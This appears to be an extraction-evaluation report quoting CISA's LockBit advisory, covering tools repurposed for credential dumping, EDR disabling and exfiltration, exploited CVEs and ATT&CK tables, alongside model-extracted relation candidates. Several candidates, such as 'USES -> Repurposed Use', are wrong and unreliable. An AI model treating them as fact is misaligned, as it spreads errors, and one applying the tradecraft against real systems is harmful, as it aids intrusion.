# Seven-report held-out bounded extraction evaluation corpus

Status: processed_with_errors

Bounded source-checked candidates only; all require semantic review. No graph writes or benchmark scores.
Four relations and up to three numbered evidence units per relation are diagnostic limits, not exhaustive annotation.
Names, types and source IDs are recovered from the saved source mention index. Unknown proper names are software candidates; this index is not exhaustive NER.
Graph-write rate, index build time and system resource measurements remain pending.

Prepared chunks: S:\ThreatWeave\work\evaluation_corpus_chunks\20261016T040604Z-bccf59fb
Model digest: 46e0c10c039e019119339687c3c1757cc81b9da49709a3b3924863ba87ca666e
Configuration hash: 92bc65a2adb978f7b4d3788767000d028bd2fbb4872e5cd00212790c807fa8af

Windows: 114 selected; 60 with candidates; 49 empty; 5 failed.
Source-checked candidate relations: 183; unique document candidates: 155; repeated relations: 28; exact source-support duplicates: 5.

## AA23-165A:evaluation:llama500:2310:4719

Status: empty_extraction
Case time: 6.02 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:


Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13.1. See the MITRE ATT&CK Tactics and Techniques section for tables of LockBit’s activity mapped to MITRE ATT&CK® tactics and techniques.
Introduction
The LockBit RaaS and its affiliates have negatively impacted organizations, both large and small, across the world. In 2022, LockBit was the most active global ransomware group and RaaS provider in terms of the number of victims claimed on their data leak site. [1] A RaaS cybercrime group maintains the functionality of a particular ransomware variant, sells access to that ransomware variant to individuals or groups of operators (often referred to as “affiliates”), and supports affiliates’ deployment of their ransomware in exchange for upfront payment, subscription fees, a cut of profits, or a combination of upfront payment, subscription fees, and a cut of profits. Some of the methods LockBit has used to successfully attract affiliates include, but are not limited to:
Assuring payment by allowing affiliates to receive ransom payments before sending a cut to the core group; this practice stands in stark contrast to other RaaS groups who pay themselves first and then disburse the affiliates’ cut.
Disparaging other RaaS groups in online forums.
Engaging in publicity-generating activities stunts, such as paying people to get LockBit tattoos and putting a $1 million bounty on information related to the real-world identity of LockBit’s lead who goes by the persona “LockBitSupp.”
Developing and maintaining a simplified, point-and-click interface for its ransomware, making it accessible to those with a lower degree of technical skill. [2, 3]
LockBit has been successful through innovation and ongoing development of the group’s administrative panel and the RaaS supporting functions. In parallel, affiliates that work with LockBit and other notable variants are constantly revising the TTPs used for deploying and executing ransomware.
Table 1 shows LockBit RaaS’s innovation and development.
Table 1: Evolution of LockBit RaaS
Date
Event
September 2019
First observed activity of ABCD ransomware, the predecessor to LockBit. [4]
January 2020
LockBit-named ransomware first seen on Russian-language based cybercrime forums.
June 2021
Appearance of LockBit version 2 (LockBit 2.0), also known as LockBit Red including StealBit, a built-in information-stealing tool.



## AA23-165A:evaluation:llama500:4484:6401

Status: candidates_ready_for_review
Case time: 1.59 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

January 2020
LockBit-named ransomware first seen on Russian-language based cybercrime forums.
June 2021
Appearance of LockBit version 2 (LockBit 2.0), also known as LockBit Red including StealBit, a built-in information-stealing tool.
October 2021
Introduction of LockBit Linux-ESXi Locker version 1.0 expanding capabilities to target systems to Linux and VMware ESXi. [5]
March 2022
Emergence of LockBit 3.0, also known as LockBit Black, that shares similarities with BlackMatter and Alphv (also known as BlackCat) ransomware.
September 2022
Non-LockBit affiliates able to use LockBit 3.0 after its builder was leaked. [2, 6]
January 2023
Arrival of LockBit Green incorporating source code from Conti ransomware. [7]
April 2023
LockBit ransomware encryptors targeting macOS seen on VirusTotal [8, 9]
LockBit 2.0, LockBit 3.0, LockBit Green, and LockBit Linux-ESXi Locker are still available for affiliates’ use on LockBit’s panel.
LockBit Statistics
Percentage of ransomware incidents attributed to LockBit:
Australia: From April 1, 2022, to March 31, 2023, LockBit made up 18% of total reported Australian ransomware incidents. This figure includes all variants of LockBit ransomware, not solely LockBit 3.0.
Canada: In 2022, LockBit was responsible for 22% of attributed ransomware incidents in Canada.[10]
New Zealand: In 2022, CERT NZ received 15 reports of LockBit ransomware, representing 23% of 2022 ransomware reports.
United States: In 2022, 16% of the State, Local, Tribal, and Tribunal (SLTT) government ransomware incidents reported to the MS-ISAC were identified as LockBit attacks. This included ransomware incidents impacting municipal governments, county governments, public higher education and K-12 schools, and emergency services (e.g., law enforcement).
Number of LockBit ransomware attacks in the U.S. since 2020:
About 1,700 attacks according to the FBI.
Total of U.S. ransoms paid to LockBit:


- Non-LockBit affiliates -> USES -> LockBit
  Literal support: Non-LockBit affiliates able to use LockBit 3.0 after its builder was leaked. [2, 6]
- Non-LockBit affiliates -> USES -> LockBit 3.0
  Literal support: Non-LockBit affiliates able to use LockBit 3.0 after its builder was leaked. [2, 6]

## AA23-165A:evaluation:llama500:6168:8098

Status: empty_extraction
Case time: 0.35 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

 public higher education and K-12 schools, and emergency services (e.g., law enforcement).
Number of LockBit ransomware attacks in the U.S. since 2020:
About 1,700 attacks according to the FBI.
Total of U.S. ransoms paid to LockBit:
Approximately $91M since LockBit activity was first observed in the U.S. on January 5, 2020.
Earliest observed LockBit activity:
Australia: The earliest documented occurrence of LockBit 3.0 was in early August 2022.
Canada: The first recorded instance of LockBit activity in Canada was in March 2020.
New Zealand: The first recorded incident involving LockBit ransomware was in March 2021.
United States: LockBit activity was first observed on January 5, 2020.
Most recently observed LockBit activity:
Australia: April 21, 2023.
New Zealand: February 2023.
United States: As recently as May 25, 2023.
Operational activity related to LockBit in France
Since the first case in July 2020 to present, ANSSI has handled 80 alerts linked to the LockBit ransomware, which accounts for 11% of all ransomware cases handled by ANSSI in that period. In about 13% of those cases, ANSSI was not able to confirm nor deny the breach of its constituents’ networks – as the alerts were related to the threat actor’s online claims. So far, 69 confirmed incidents have been handled by ANSSI. Table 2 shows the LockBit activity observed by ANSSI versus overall ransomware activity tracked by the Computer Emergency Response Team-France (CERT-FR).
Table 2: ANSSI-Observed LockBit vs. Overall Ransomware Activity
Year
Number of Incidents
Percentage of CERT-FR’s Ransomware-Related Activity
2020 (from July)
4
2%
2021
20
10%
2022
30
27%
2023
15
27%
Total (2020-2023)
69
11%
Table 3 shows the number of instances different LockBit strains were observed by ANSSI from July 2020 to present.
Table 3: ANSSI-Observed LockBit Strain and Number of Instances
Name of the Strain*
Number of Instances
LockBit 2.0 (LockBit Red)
26



## AA23-165A:evaluation:llama500:7876:9874

Status: empty_extraction
Case time: 0.33 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

 of instances different LockBit strains were observed by ANSSI from July 2020 to present.
Table 3: ANSSI-Observed LockBit Strain and Number of Instances
Name of the Strain*
Number of Instances
LockBit 2.0 (LockBit Red)
26
LockBit 3.0 (LockBit Black)
23
LockBit
21
LockBit Green
1
LockBit (pre-encryption)
1
Total
72**
* Name either obtained from ANSSI’s or the victim’s investigations
** Includes incidents with multiple strains
Figure 1: ANSSI-Observed LockBit Strains by Year
From the incidents handled, ANSSI can infer that LockBit 3.0 widely took over from LockBit 2.0 and the original LockBit strain from 2022. In two cases, victims were infected with as many as three different strains of LockBit (LockBit 2.0/Red, LockBit 3.0/Black, and LockBit Green).
Leak Sites
The authoring agencies observe data leak sites, where attackers publish the names and captured data of victims if they do not pay ransom or hush money. Additionally, these sites can be used to record alleged victims who have been threatened with a data leak. The term 'victims' may include those who have been attacked, or those who have been threatened or blackmailed (with the attack having taken place).
The leak sites only show the portion of LockBit affiliates’ victims subjected to secondary extortion. Since 2021, LockBit affiliates have employed double extortion by first encrypting victim data and then exfiltrating that data while threatening to post that stolen data on leak sites. Because LockBit only reveals the names and leaked data of victims who refuse to pay the primary ransom to decrypt their data, some LockBit victims may never be named or have their exfiltrated data posted on leak sites. As a result, the leak sites reveal a portion of LockBit affiliates’ total victims. For these reasons, the leak sites are not a reliable indicator of when LockBit ransomware attacks occurred. The date of data publication on the leak sites may be months after LockBit affiliates actually executed ransomware attacks.



## AA23-165A:evaluation:llama500:9561:12066

Status: candidates_ready_for_review
Case time: 0.99 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

 a result, the leak sites reveal a portion of LockBit affiliates’ total victims. For these reasons, the leak sites are not a reliable indicator of when LockBit ransomware attacks occurred. The date of data publication on the leak sites may be months after LockBit affiliates actually executed ransomware attacks.
Up to the Q1 2023, a total of 1,653 alleged victims were observed on LockBit leak sites. With the introduction of LockBit 2.0 and LockBit 3.0, the leak sites have changed, with some sources choosing to differentiate leak sites by LockBit versions and others ignoring any differentiation. Over time, and through different evolutions of LockBit, the address and layout of LockBit leak sites have changed and are aggregated under the common denominator of the LockBit name. The introduction of LockBit 2.0 at the end of the Q2 2021 had an immediate impact on the cybercriminal market due to multiple RaaS operations shutting down in May and June 2021 (e.g., DarkSide and Avaddon). LockBit competed with other RaaS operations, like Hive RaaS, to fill the gap in the cybercriminal market leading to an influx of LockBit affiliates. Figure 2 shows the alleged number of victims worldwide on LockBit leak sites starting in Q3 2020. Figure 2 shows the alleged number of victims worldwide on LockBit leak sites starting in Q3 2020.
Figure 2: Alleged Number of Victims Worldwide on LockBit Leak Sites
Tools
During their intrusions, LockBit affiliates have been observed using various freeware and open-source tools that are intended for legal use. When repurposed by LockBit, these tools are then used for a range of malicious cyber activity, such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and batch scripts are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed.
Table 4 shows a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations. The legitimate freeware and open-source tools mentioned in this product are all publicly available and legal. The use of these tools by a threat actor should not be attributed to the freeware and open-source tools, absent specific articulable facts tending to show they are used at the direction or under the control of a threat actor.


- LockBit affiliates -> USES -> LockBit
  Literal support: LockBit competed with other RaaS operations, like Hive RaaS, to fill the gap in the cybercriminal market leading to an influx of LockBit affiliates.

## AA23-165A:evaluation:llama500:11762:14040

Status: candidates_ready_for_review
Case time: 1.11 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

-source tools mentioned in this product are all publicly available and legal. The use of these tools by a threat actor should not be attributed to the freeware and open-source tools, absent specific articulable facts tending to show they are used at the direction or under the control of a threat actor.
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID
7-zip
Compresses files into an archive.
Compresses data to avoid detection before exfiltration.
T1562
Impair Defenses
AdFind
Searches Active Directory (AD) and gathers information.
Gathers AD information used to exploit a victim’s network, escalate privileges, and facilitate lateral movement.
S0552
AdFind
Advanced Internet Protocol (IP) Scanner
Performs network scans and shows network devices.
Maps a victim’s network to identify potential access vectors.
T1046
Network Service Discovery
Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
AdvancedRun
Allows software to be run with different settings.
Enables escalation of privileges by changing settings before running software.
TA0004
Privilege Escalation
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
Backstab
Terminates antimalware-protected processes.
Terminates endpoint detection and response (EDR)- protected processes.
T1562.001
Impair Defenses: Disable or Modify Tools
Bat Armor
Generates .bat files using PowerShell scripts.
Bypasses PowerShell execution policy.
T1562.001
Impair Defenses: Disable or Modify Tools
Bloodhound
Performs reconnaissance of AD for attack path management.
Enables identification of AD relationships that can be exploited to gain access onto a victim’s network.
T1482
Domain Trust Discovery
Chocolatey
Handles command-line package management on Microsoft Windows.
Facilitates installation of LockBit affiliate actors’ tools.
T1072
Software Deployment Tools


- LockBit Affiliates -> USES -> Repurposed Use
  Literal support: Repurposed Use by LockBit Affiliates

## AA23-165A:evaluation:llama500:13738:15981

Status: validation_failed
Case time: 5.88 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

.
Enables identification of AD relationships that can be exploited to gain access onto a victim’s network.
T1482
Domain Trust Discovery
Chocolatey
Handles command-line package management on Microsoft Windows.
Facilitates installation of LockBit affiliate actors’ tools.
T1072
Software Deployment Tools
Defender Control
Disables Microsoft Defender.
Enables LockBit affiliate actors to bypass Microsoft Defender.
T1562.001
Impair Defenses: Disable or Modify Tools
ExtPassword
Recovers passwords from Windows systems.
Obtains credentials for network access and exploitation.
T1003
Operating System (OS) Credential Dumping
FileZilla
Performs cross-platform File Transfer Protocol (FTP) to a site, server, or host.
Enables data exfiltration over FTP to the LockBit affiliate actors’ site, server, or host.
T1071.002
Application Layer Protocol: File Transfer Protocols
FreeFileSync
Facilitates cloud-based file synchronization.
Facilitates cloud-based file synchronization for data exfiltration.
T1567.002
Exfiltration Over Web Service: Exfiltration to Cloud Storage
GMER
Removes rootkits.
Terminates and removes EDR software.
T1562.001
Impair Defenses: Disable or Modify Tools
Impacket
Collection of Python classes for working with network protocols.
Enables lateral movement on a victim’s network.
S0357
Impacket
LaZagne
Recovers system passwords across multiple platforms.
Collect credentials for accessing a victim’s systems and network.
S0349
LaZagne
Ligolo
Establishes SOCKS5 or TCP tunnels from a reverse connection for pen testing.
Enables connections to systems within the victim’s network via reverse tunneling.
T1095
Non-Application Layer Protocol
LostMyPassword
Recovers passwords from Windows systems.
Obtains credentials for network access and exploitation.
T1003
OS Credential Dumping
MEGA Ltd MegaSync
Facilitates cloud-based file synchronization.
Facilitates cloud-based file synchronization for data exfiltration.
T1567.002
Exfiltration Over Web Service: Exfiltration to Cloud Storage
Microsoft Sysinternals ProcDump
Monitors applications for central processing unit (CPU) spikes and generates crash dumps during a spike.
Obtains credentials by dumping the contents of Local Security Authority Subsystem Service (LSASS).
T1003.001


Error: Repeated selected relationship.

## AA23-165A:evaluation:llama500:15691:17884

Status: empty_extraction
Case time: 0.44 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

 Web Service: Exfiltration to Cloud Storage
Microsoft Sysinternals ProcDump
Monitors applications for central processing unit (CPU) spikes and generates crash dumps during a spike.
Obtains credentials by dumping the contents of Local Security Authority Subsystem Service (LSASS).
T1003.001
OS Credential Dumping: LSASS Memory
Microsoft Sysinternals PsExec
Executes a command-line process on a remote machine.
Enables LockBit affiliate actors to control victim’s systems.
S0029
PsExec
Mimikatz
Extracts credentials from a system.
Extracts credentials from a system for gaining network access and exploiting systems.
S0002
Mimikatz
Ngrok
Enables remote access to a local web server by tunnelling over the internet.
Enables victim network protections to be bypassed by tunnelling to a system over the internet.
S0508
Ngrok
PasswordFox
Recovers passwords from Firefox Browser.
Obtains credentials for network access and exploitation.
T1555.003
Credentials from Web Browsers
PCHunter
Enables advanced task management including system processes and kernels.
Terminates and circumvents EDR processes and services.
T1562.001
Impair Defenses: Disable or Modify Tools
PowerTool
Removes rootkits, as well as detecting, analyzing, and fixing kernel structure modifications.
Terminates and removes EDR software.
T1562.001
Impair Defenses: Disable or Modify Tools
Process Hacker
Removes rootkits.
Terminates and removes EDR software.
T1562.001
Impair Defenses: Disable or Modify Tools
PuTTY Link (Plink)
Automates Secure Shell (SSH) actions on Windows.
Enables LockBit affiliate actors to avoid detection.
T1572
Protocol Tunneling
Rclone
Manages cloud storage files using a command-line program.
Facilitates data exfiltration over cloud storage.
S1040
Rclone
Seatbelt
Performs numerous security-oriented checks.
Performs numerous security-oriented checks to enumerate system information.
T1082
System Information Discovery
ScreenConnect (also known as ConnectWise)
Enables remote connections to network devices for management.
Enables LockBit affiliate actors to remotely connect to a victim’s systems.
T1219
Remote Access Software
SoftPerfect Network Scanner
Performs network scans for systems management.



## AA23-165A:evaluation:llama500:17571:19802

Status: empty_extraction
Case time: 0.49 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

System Information Discovery
ScreenConnect (also known as ConnectWise)
Enables remote connections to network devices for management.
Enables LockBit affiliate actors to remotely connect to a victim’s systems.
T1219
Remote Access Software
SoftPerfect Network Scanner
Performs network scans for systems management.
Enables LockBit affiliate actors to obtain information about a victim’s systems and network.
T1046
Network Service Discovery
Splashtop
Enables remote connections to network devices for management.
Enables LockBit affiliate actors to remotely connect to systems over Remote Desktop Protocol (RDP).
T1021.001
Remote Services: Remote Desktop Protocol
TDSSKiller
Removes rootkits.
Terminates and removes EDR software.
T1562.001
Impair Defenses: Disable or Modify Tools
TeamViewer
Enables remote connections to network devices for management.
Enables LockBit affiliate actors to remotely connect to a victim’s systems.
T1219
Remote Access Software
ThunderShell
Facilitates remote access via Hypertext Transfer Protocol (HTTP) requests.
Enables LockBit affiliate actors to remotely access systems while encrypting network traffic.
T1071.001
Application Layer Protocol: Web Protocols
WinSCP
Facilitates file transfer using SSH File Transfer Protocol for Microsoft Windows.
Enables data exfiltration via the SSH File Transfer Protocol.
T1048
Exfiltration Over Alternative Protocol
Common Vulnerabilities and Exposures (CVEs) Exploited
Based on secondary sources, it was noted that affiliates exploit older vulnerabilities like CVE-2021-22986, F5 iControl REST unauthenticated Remote Code Execution Vulnerability, as well as newer vulnerabilities such as:
CVE-2023-0669: Fortra GoAnyhwere Managed File Transfer (MFT) Remote Code Execution Vulnerability
CVE-2023-27350: PaperCut MF/NG Improper Access Control Vulnerability
LockBit affiliates have been documented exploiting numerous CVEs, including:
CVE-2021-44228: Apache Log4j2 Remote Code Execution Vulnerability,
CVE-2021-22986: F5 BIG-IP and BIG-IQ Centralized Management iControl REST Remote Code Execution Vulnerability,
CVE-2020-1472: NetLogon Privilege Escalation Vulnerability,
CVE-2019-0708: Microsoft Remote Desktop Services Remote Code Execution Vulnerability, and



## AA23-165A:evaluation:llama500:19556:21857

Status: empty_extraction
Case time: 0.40 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

 F5 BIG-IP and BIG-IQ Centralized Management iControl REST Remote Code Execution Vulnerability,
CVE-2020-1472: NetLogon Privilege Escalation Vulnerability,
CVE-2019-0708: Microsoft Remote Desktop Services Remote Code Execution Vulnerability, and
CVE-2018-13379: Fortinet FortiOS Secure Sockets Layer (SSL) Virtual Private Network (VPN) Path Traversal Vulnerability.
For further information on these CVEs, see CISA’s Known Exploited Vulnerabilities (KEV) Catalog.
Post Detonation TTPs
When LockBit affiliates target an organization responsible for managing other organizations’ networks, CERT NZ has observed LockBit affiliates attempt secondary ransomware extortion after detonation of the LockBit variant on the primary target. Once the primary target is hit, LockBit affiliates then attempt to extort the companies that are customers of the primary target. This extortion is in the form of secondary ransomware that locks down services those customers consume. Additionally, the primary target’s customers may be extorted by LockBit affiliates threatening to release those customers’ sensitive information.
MITRE ATT&CK Tactics and Techniques
Tables 5-16 show the LockBit affiliate tactics and techniques referenced in this advisory.
Table 5: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Initial Access
Technique Title
ID
Use
Drive-by Compromise
T1189
LockBit affiliates gain access to a system through a user visiting a website over the normal course of browsing.
Exploit Public-Facing Application
T1190
LockBit affiliates may exploit vulnerabilities (e.g., Log4Shell) in internet-facing systems to gain access to victims’ systems.
External Remote Services
T1133
LockBit affiliates exploit RDP to gain access to victims’ networks.
Phishing
T1566
LockBit affiliates use phishing and spearphishing to gain access to victims' networks.
Valid Accounts
T1078
LockBit affiliates obtain and abuse credentials of existing accounts as a means of gaining initial access.
Table 6: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Execution
Technique Title
ID
Use
Execution
TA0002
LockBit 3.0 launches commands during its execution.
Command and Scripting Interpreter: Windows Command Shell
T1059.003
LockBit affiliates use batch scripts to execute malicious commands.
Software Deployment Tools



## AA23-165A:evaluation:llama500:21591:23692

Status: candidates_ready_for_review
Case time: 1.08 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

 – Execution
Technique Title
ID
Use
Execution
TA0002
LockBit 3.0 launches commands during its execution.
Command and Scripting Interpreter: Windows Command Shell
T1059.003
LockBit affiliates use batch scripts to execute malicious commands.
Software Deployment Tools
T1072
LockBit affiliates may use Chocolatey, a command-line package manager for Windows.
Technique Title
ID
Use
System Services: Service Execution
T1569.002
LockBit 3.0 uses PsExec to execute commands or payloads.
Table 7: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Persistence
Technique Title
ID
Use
Boot or Logon Autostart Execution
T1547
LockBit affiliates enables automatic logon for persistence.
Valid Accounts
T1078
LockBit affiliates may use a compromised user account to maintain persistence on the target network.
Table 8: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Privilege Escalation
Technique Title
ID
Use
Privilege Escalation
TA0004
LockBit affiliates will attempt to escalate to the required privileges if current account privileges are insufficient.
Abuse Elevation Control Mechanism
T1548
LockBit affiliates may use ucmDccwCOM Method in UACMe, a GitHub collection of User Account Control (UAC) bypass techniques.
Boot or Logon Autostart Execution
T1547
LockBit affiliates enable automatic logon for privilege escalation.
Domain Policy Modification: Group Policy Modification
T1484.001
LockBit affiliates may create Group Policy for lateral movement and can force group policy updates.
Valid Accounts
T1078
LockBit affiliates may use a compromised user account to escalate privileges on a victim’s network.
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
Technique Title
ID
Use
Execution Guardrails: Environmental Keying
T1480.001
LockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered.
Impair Defenses: Disable or Modify Tools
T1562.001
LockBit 3.0 affiliates use Backstab, Defender Control, GMER, PCHunter, PowerTool, Process Hacker or TDSSKiller to disable EDR processes and services.


- LockBit affiliates -> USES -> UACMe
  Literal support: LockBit affiliates may use ucmDccwCOM Method in UACMe, a GitHub collection of User Account Control (UAC) bypass techniques.

## AA23-165A:evaluation:llama500:23461:25646

Status: candidates_ready_for_review
Case time: 2.93 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

 correct password is entered.
Impair Defenses: Disable or Modify Tools
T1562.001
LockBit 3.0 affiliates use Backstab, Defender Control, GMER, PCHunter, PowerTool, Process Hacker or TDSSKiller to disable EDR processes and services.
LockBit 3.0 affiliates use Bat Armor to bypass the PowerShell execution Policy.
LockBit affiliates may deploy a batch script, 123.bat, to disable and uninstall antivirus software.
Lockbit 3.0 may modify and/or disable security tools including EDR and antivirus to avoid possible detection of malware, tools, and activities.
Indicator Removal: Clear Windows Event Logs
T1070.001
LockBit executable clears the Windows Event Logs files.
Indicator Removal: File Deletion
T1070.004
LockBit 3.0 will delete itself from the disk.
Obfuscated Files or Information
T1027
LockBit 3.0 will send encrypted host and bot information to its command and control (C2) servers.
Obfuscated Files or Information: Software Packing
T1027.002
LockBit affiliates may perform software packing or virtual machine software protection to conceal their code. Blister Loader has been used for such purpose.
Table 10: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Credential Access
Technique Title
ID
Use
Brute Force
T1110
LockBit affiliates may leverage VPN or RDP brute force credentials as an initial access.
Credentials from Password Stores: Credentials from Web Browsers
T1555.003
LockBit 3.0 actors use PasswordFox to recover passwords from Firefox Browser.
OS Credential Dumping
T1003
LockBit 3.0 actors use ExtPassword or LostMyPassword to recover passwords from Windows systems.
OS Credential Dumping: LSASS Memory
T1003.001
LockBit affiliates may use Microsoft Sysinternals ProDump to dump the contents of lsass.exe.
LockBit affiliates have used Mimikatz to dump credentials.
Table 11: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Discovery
Technique Title
ID
Use
Network Service Discovery
T1046
LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network.


- LockBit affiliates -> USES -> 123.bat
  Literal support: LockBit affiliates may deploy a batch script, 123.bat, to disable and uninstall antivirus software.
- LockBit affiliates -> USES -> Microsoft Sysinternals ProDump
  Literal support: LockBit affiliates may use Microsoft Sysinternals ProDump to dump the contents of lsass.exe.
- LockBit affiliates -> USES -> lsass.exe
  Literal support: LockBit affiliates may use Microsoft Sysinternals ProDump to dump the contents of lsass.exe.
- LockBit affiliates -> USES -> Mimikatz
  Literal support: LockBit affiliates have used Mimikatz to dump credentials.

## AA23-165A:evaluation:llama500:25345:27570

Status: candidates_ready_for_review
Case time: 2.32 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:


ID
Use
Network Service Discovery
T1046
LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network.
System Information Discovery
T1082
LockBit affiliates will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.
System Location Discovery: System Language Discovery
T1614.001
LockBit 3.0 will not infect machines with language settings that match a defined exclusion list.
Table 12: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Lateral Movement
Technique Title
ID
Use
Lateral Movement
TA0008
LockBit affiliates will laterally move across networks and access domain controllers.
Remote Services: Remote Desktop Protocol
T1021.001
LockBit affiliates use Splashtop remote-desktop software to facilitate lateral movement.
Remote Services: Server Message Block (SMB)/Admin Windows Shares
T1021.002
LockBit affiliates may use Cobalt Strike and target SMB shares for lateral movement.
Table 13: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Collection
Technique Title
ID
Use
Archive Collected Data: Archive via Utility
T1560.001
LockBit affiliates may use 7-zip to compress and/or encrypt collected data prior to exfiltration.
Table 14: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Command and Control
Technique Title
ID
Use
Application Layer Protocol: File Transfer Protocols
T1071.002
LockBit affiliates may use FileZilla for C2.
Application Layer Protocol: Web Protocols
T1071.001
LockBit affiliates use ThunderShell as a remote access tool that communicates via HTTP requests.
Non-Application Layer Protocol
T1095
LockBit affiliates use Ligolo to establish SOCKS5 or TCP tunnels from a reverse connection.
Protocol Tunneling
T1572
LockBit affiliates use Plink to automate SSH actions on Windows.
Remote Access Software
T1219
LockBit 3.0 actors use AnyDesk, Atera RMM, ScreenConnect or TeamViewer for C2.
Table 15: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Exfiltration


- LockBit affiliates -> USES -> SoftPerfect Network Scanner
  Literal support: LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
- LockBit affiliates -> USES -> AdFind
  Literal support: LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network.
- LockBit affiliates -> USES -> Cobalt Strike
  Literal support: LockBit affiliates may use Cobalt Strike and target SMB shares for lateral movement.

## AA23-165A:evaluation:llama500:26834:28843

Status: candidates_ready_for_review
Case time: 1.72 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a

Exact source window:

&CK Techniques for Enterprise – Command and Control
Technique Title
ID
Use
Application Layer Protocol: File Transfer Protocols
T1071.002
LockBit affiliates may use FileZilla for C2.
Application Layer Protocol: Web Protocols
T1071.001
LockBit affiliates use ThunderShell as a remote access tool that communicates via HTTP requests.
Non-Application Layer Protocol
T1095
LockBit affiliates use Ligolo to establish SOCKS5 or TCP tunnels from a reverse connection.
Protocol Tunneling
T1572
LockBit affiliates use Plink to automate SSH actions on Windows.
Remote Access Software
T1219
LockBit 3.0 actors use AnyDesk, Atera RMM, ScreenConnect or TeamViewer for C2.
Table 15: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Exfiltration
Technique Title
ID
Use
Exfiltration
TA0010
LockBit affiliates use StealBit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.
Exfiltration Over Web Service
T1567
LockBit affiliates use publicly available file sharing services to exfiltrate a target’s data.
Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
LockBit affiliates use (1) Rclone, an open-source command line cloud storage manager or FreeFileSync to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration.
Table 16: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Impact
Technique Title
ID
Use
Data Destruction
T1485
LockBit 3.0 deletes log files and empties the recycle bin.
Data Encrypted for Impact
T1486
LockBit 3.0 encrypts data on target systems to interrupt availability to system and network resources.
LockBit affiliates can encrypt Windows and Linux devices, as well as VMware instances.
Defacement: Internal Defacement
T1491.001
LockBit 3.0 changes the host system’s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively.
Inhibit System Recovery
T1490
LockBit 3.0 deletes volume shadow copies residing on disk.
Service Stop
T1489
LockBit 3.0 terminates processes and services.


- LockBit affiliates -> USES -> StealBit
  Literal support: LockBit affiliates use StealBit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.
- LockBit affiliates -> USES -> Rclone
  Literal support: LockBit affiliates use (1) Rclone, an open-source command line cloud storage manager or FreeFileSync to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration.

## AA23-061A:evaluation:llama500:4148:6616

Status: candidates_ready_for_review
Case time: 3.11 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:


Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 15. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
